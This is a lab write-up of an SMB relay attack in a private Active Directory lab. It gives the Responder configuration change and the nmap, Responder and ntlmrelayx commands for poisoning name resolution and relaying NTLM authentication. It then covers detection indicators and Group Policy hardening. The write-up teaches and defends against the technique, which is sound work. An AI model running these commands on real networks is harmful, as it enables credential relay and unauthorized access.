# SMB Relay Attack

**Date:** May 2026  
**Author:** ShahinSecLab  
**Category:** Credential Access 
**Difficulty:** Easy  
**Target:** Active Directory Lab
**Tools:** Nmap, Responder, ntlmrelayx.py

- [Introduction](#introduction)
- [Attack Flow](#attack-flow)
- [Why This Attack Works](#why-this-attack-works)
- [Lab Setup](#lab-setup)
- [Tools Used](#tools-used)
- [Prerequisites](#prerequisites)
- [Step 1 — Disabling SMB and HTTP in Responder](#step-1--disabling-smb-and-http-in-responder)
- [Step 2 — Checking SMB2 Security Mode](#step-2--checking-smb2-security-mode)
- [Step 3 — Creating the Target List](#step-3--creating-the-target-list)
- [Step 4 — Starting Responder](#step-4--starting-responder)
- [Step 5 — Starting ntlmrelayx](#step-5--starting-ntlmrelayx)
- [Step 6 — Triggering NTLM Authentication](#step-6--triggering-ntlm-authentication)
- [Step 7 — Achieving Successful NTLM Relay](#step-7--achieving-successful-ntlm-relay)
- [How Defenders Can Catch This](#how-defenders-can-catch-this)
- [How to Prevent It](#how-to-prevent-it)
- [References](#references)
- [Lessons Learned](#lessons-learned)

## Introduction

SMB Relay is a network attack that allows an attacker to use a victim's NTLM authentication to access another system without knowing or cracking the victim's password. Instead of stealing the password, the attacker intercepts the authentication request and forwards it to a different machine that accepts NTLM authentication.

This attack usually works in Windows Active Directory environments where LLMNR or NBT-NS is enabled and SMB signing is not enforced. By responding to a victim's name resolution request, an attacker can capture NTLM authentication and relay it to another vulnerable system. If the target accepts the authentication, the attacker can gain access with the same permissions as the victim.

In this lab, I demonstrate how SMB Relay works in a controlled Active Directory environment. The goal is to understand the attack process, identify the conditions that make the attack possible, and learn how proper security settings such as SMB signing can prevent it.

## Attack Flow

```
Disable SMB and HTTP in Responder
                ↓
Check SMB Signing with Nmap
                ↓
Identify Hosts with SMB Signing Disabled
                ↓
Create Target List
                ↓
Start Responder
                ↓
Start ntlmrelayx
                ↓
Victim Attempts to Access a Fake Network Share
                ↓
Responder Receives the LLMNR/NBT-NS Request
                ↓
Victim Sends NTLM Authentication
                ↓
ntlmrelayx Relays Authentication to the Target
                ↓
Target Accepts Authentication
(SMB Signing Disabled)
                ↓
Gain Access Using the Victim's Session
```

## Why This Attack Works

SMB Relay attacks succeed because of a combination of insecure network protocols and system misconfigurations. When a user attempts to access a network resource that does not exist, Windows may use LLMNR or NBT-NS to find the requested host. An attacker on the same network can respond to this request before the legitimate system does.

The victim then sends an NTLM authentication request to the attacker's machine. Instead of trying to crack the password, the attacker immediately forwards the authentication to another system that accepts NTLM authentication.

If SMB signing is disabled or not required on the target system, the forwarded authentication is accepted as legitimate. As a result, the attacker can access the target using the victim's privileges without ever knowing the victim's password.

For this attack to succeed, the following conditions are typically present:

- The attacker is on the same network as the victim.
- LLMNR or NBT-NS is enabled on the victim's system.
- The target system accepts NTLM authentication.
- SMB signing is disabled or not enforced on the target.
- The victim authenticates to a network resource controlled by the attacker.

## Lab Setup

|    Machine         |      OS       |               Role                   |      Ip       |
|--------------------|---------------|--------------------------------------|---------------|
| Attacker Machine           | Kali Linux    | Attack machine                       | `192.168.5.128` |
| Victim Machine            | Windows 10    | Victim machine(Authentication Source)| `192.168.5.135` |
| Windows Server / DC| Windows Server| Domain Controller / Protected Target | `192.168.5.134` |
| Target Machine            | Windows 10    | Relay Target (Vulnerable Host)       | `192.168.5.136` |

## Tools Used

| Tool | Purpose |
|------|---------|
| `Nmap` | Scans the network and checks whether SMB signing is enabled or disabled on target systems. |
| `Responder` | Listens for LLMNR and NBT-NS requests and captures NTLM authentication from victims. |
| `ntlmrelayx.py` | Relays captured NTLM authentication to another system using the Impacket framework. |
| `Nano` | Used to edit configuration files and create the target list. |

## Prerequisites

| What | Why |
|------|-----|
| Kali Linux machine | Attacker machine with required penetration testing tools installed |
| Active Directory environment | Provides domain users, authentication flow, and target systems |
| Victim machine connected to the network | Generates NTLM authentication requests that can be captured and relayed |
| Relay target machine | The system where captured authentication will be forwarded |
| Network connectivity between all machines | Required for communication between attacker, victim, and target systems |
| LLMNR/NBT-NS enabled | Allows the attacker to capture authentication requests from name resolution poisoning |
| SMB signing disabled on target systems | Allows NTLM authentication to be relayed successfully |
| User account with network authentication activity | Needed to generate NTLM authentication traffic |
| Authorization to perform the test | Ensures the assessment is performed legally |

## Step 1 — Disabling SMB and HTTP in Responder

First, I opened the Responder configuration file:

```bash
sudo nano /etc/responder/Responder.conf
```

<p align="center">
  <img src="/Active-Directory/02-smb-relay/images/step1-1.png" width="600">
</p>

Inside the file, I found and changed the following settings:

```bash
SMB = Off
HTTP = Off
```

<p align="center">
  <img src="/Active-Directory/02-smb-relay/images/step1-2.png" width="600">
</p>

After that, I saved the file:

```bash
CTRL + X
Y
ENTER
```

## Step 2 — Checking SMB2 Security Mode

I scanned the network to check SMB signing status using Nmap:

```bash
nmap --script smb2-security-mode -p 445 192.168.5.0/24
```
**Flag Breakdown**

|             Flag            |                                 Meaning                                                   |
|-----------------------------|-------------------------------------------------------------------------------------------|
| `nmap`                        | Network scanning tool used for reconnaissance                                             |
| `--script smb2-security-mode` | Runs an Nmap NSE script to check SMB v2/v3 security configuration, especially SMB signing |
| `-p 445`                      | Targets port 445 (SMB service)                                                            |
| `192.168.5.0/24`              | Scans the entire subnet (all hosts from 192.168.5.1 to 192.168.5.254)                     |


<p align="center">
  <img src="/Active-Directory/02-smb-relay/images/step2.png" width="600">
</p>

## Step 3 — Creating the Target List

I created a file to store the target IP addresses:

```bash
nano targets.txt
```

<p align="center">
  <img src="/Active-Directory/02-smb-relay/images/step3-1.png" width="600">
</p>

Inside the file, I added the target IPs:

```bash
192.168.5.134
192.168.5.135
192.168.5.136
```

<p align="center">
  <img src="/Active-Directory/02-smb-relay/images/step3-2.png" width="600">
</p>

After that, I saved the file:

```bash
CTRL + X
Y
ENTER
```

## Step 4 — Starting Responder

I started Responder on my network interface:

```bash
sudo responder -I eth0 -dwv
```
**Flag Breakdown**

|    Flag   |     Meaning       |
|-----------|-------------------|
| `-I eth0`   | Network interface |
|    `-d`     | DHCP poisoning    |
|    `-w`     | WPAD proxy server |
|    `-v`     | Verbose mode      |


<p align="center">
  <img src="/Active-Directory/02-smb-relay/images/step4.png" width="600">
</p>

## Step 5 — Starting ntlmrelayx

In another terminal, I started the relay attack using ntlmrelayx:

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```
**Flag Breakdown**

|     Flag                       | Meaning                         |
|----------------|-------------------------------------------------|
| `ntlmrelayx.py`  | Impacket tool used to perform NTLM relay attacks|
| `-tf targets.txt`|Target file containing a list of SMB targets     |
| `-smb2support`| Enables SMB2/SMB3 protocol support              |


<p align="center">
  <img src="/Active-Directory/02-smb-relay/images/step5.png" width="600">
</p>

## Step 6 — Triggering NTLM Authentication

From the victim machine, I opened File Explorer and typed:

```bash
\\fakeshare
```

After pressing Enter, the system tried to connect and sent NTLM authentication over the network.

<p align="center">
  <img src="/Active-Directory/02-smb-relay/images/step6.png" width="600">
</p>

## Step 7 — Achieving Successful NTLM Relay

The relay attack worked successfully, and the authentication was accepted by the target system.

<p align="center">
  <img src="/Active-Directory/02-smb-relay/images/step7.png" width="600">
</p>

## How Defenders Can Catch This

| Indicator | What to look for |
|-----------|------------------|
| Unexpected NTLM authentication requests | Check Windows logs for unusual authentication attempts |
| SMB login from unknown machines | Review network logs for suspicious SMB connections |
| LLMNR or NBT-NS requests on the network | Monitor name resolution traffic |
| SMB signing disabled on systems | Check SMB security settings regularly |
| Excessive NTLM authentication usage | Review and limit NTLM usage where possible |
| Unauthorized access to shared folders | Monitor file share access logs |
| Unusual SMB communication between systems | Review network traffic for abnormal connections |

## How to Prevent It

**Disable LLMNR**
LLMNR allows systems to ask other machines on the network to resolve names. Disable it through Group Policy:

```
Computer Configuration → Administrative Templates → Network → DNS Client → Turn Off Multicast Name Resolution → Enabled
```

**Disable NBT-NS**
NBT-NS can be abused to capture NTLM authentication. Disable it on network adapters:

```
Network Adapter Settings → IPv4 Properties → Advanced → WINS → Disable NetBIOS over TCP/IP
```

**Enable SMB Signing**
SMB signing prevents attackers from relaying SMB authentication requests. Enable it through Group Policy:

```
Computer Configuration → Windows Settings → Security Settings
→ Local Policies → Security Options
→ Microsoft network server: Digitally sign communications (always) → Enabled
```

**Disable NTLM Authentication Where Possible**
NTLM is an older authentication protocol and can be abused in relay attacks. Use Kerberos authentication whenever possible.

```
Computer Configuration → Windows Settings → Security Settings
→ Local Policies → Security Options
→ Network security: Restrict NTLM
```

**Keep Systems Updated**
Regularly update Windows systems, domain controllers, and security policies to reduce security risks.

```
Windows Update → Check for Updates
```

**Use Network Segmentation**
Separate critical systems from normal user networks. This limits the attacker's ability to move between machines.

**Monitor Authentication Logs**
Regularly review Windows Event Logs for unusual NTLM authentication and SMB activity.

```
Event Viewer → Windows Logs → Security
```

## References

- Microsoft Documentation – SMB Security  
  https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-security

- Microsoft NTLM Overview  
  https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview

- Impacket Project (ntlmrelayx tool)  
  https://github.com/fortra/impacket

- Responder Tool Documentation  
  https://github.com/lgandx/Responder

- SMB Relay Attack Explanation (General Concept)  
  https://attack.mitre.org/techniques/T1557/001/

  ## Lessons Learned

- SMB Relay attacks do not require password cracking; they reuse valid NTLM authentication sessions.
- Weak network configurations like enabled LLMNR and NBT-NS can expose Windows environments to attacks.
- SMB signing is an important security control that helps prevent authentication relay attacks.
- Understanding how Windows authentication works is important for identifying security weaknesses.
- Small configuration mistakes in Active Directory environments can create serious security risks.
- Proper monitoring and security hardening can reduce the impact of SMB Relay attacks.